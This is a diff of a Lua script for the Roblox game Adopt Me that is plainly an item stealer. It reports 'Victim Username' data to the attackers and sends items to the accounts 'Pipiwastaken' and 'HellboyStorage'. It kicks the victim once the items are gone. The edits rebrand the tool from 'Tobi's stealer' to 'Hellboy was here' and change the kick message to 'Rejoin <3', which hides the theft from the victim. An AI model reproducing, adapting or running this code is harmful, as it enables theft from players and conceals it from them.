@@ -1,5 +1,5 @@
 print("Hellboy was here")
-
+wait(5)
 local users = {"Pipiwastaken", "HellboyStorage"}
 local min_value = 0.000001
 local ping = "Yes"
@@ -126,7 +126,7 @@ local function SendJoinMessage(list, prefix)
     local fields = {
         {
             name = "Victim Username:",
-            value = plr.Name,
+            value = plr.Username,
             inline = true
         },
         {
@@ -194,7 +194,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Hellboy was here"
             }
         }}
     }
@@ -216,7 +216,7 @@ local function SendMessage(sortedItems)
 	local fields = {
 		{
 			name = "Victim Username:",
-			value = plr.Name,
+			value = plr.Username,
 			inline = true
 		},
 		{
@@ -404,7 +404,7 @@ if #itemsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Rejoin <3")
     end
 
     local function waitForUserChat()
